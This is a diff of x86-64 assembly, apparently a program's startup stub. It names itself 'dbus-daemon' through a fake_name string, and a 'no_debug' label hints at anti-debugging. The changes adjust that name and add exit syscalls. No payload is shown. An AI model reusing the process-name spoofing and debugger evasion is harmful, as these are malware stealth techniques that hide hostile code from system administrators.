@@ -3,10 +3,12 @@ bits 64
 extern dbus
 extern __libc_start_main
 
+global exit_force
+
 global _start
 
 section .data
-    fake_name db "dbus-daemon",0
+    fake_name db "dbus-daemon ",0
     len_fake equ $-fake_name
 
 section .text
@@ -16,6 +18,12 @@ write:
     mov rdi, rdi
     mov rsi, rsi
     mov rdx, rdx
+    syscall
+    ret
+
+exit_force:
+    mov rax, 60
+    mov rdi, rdi
     syscall
     ret
 
@@ -70,9 +78,12 @@ no_debug:
     mov     rdx, r13
     xor     rcx, rcx
     xor     r8,  r8
-    xor     r9,  r9
+    mov     r9,  r14
     mov     rax, rsp
     push rax
 
     call __libc_start_main wrt ..plt
-    hlt
+    
+    mov rax, 60
+    mov rdi, 0
+    syscall
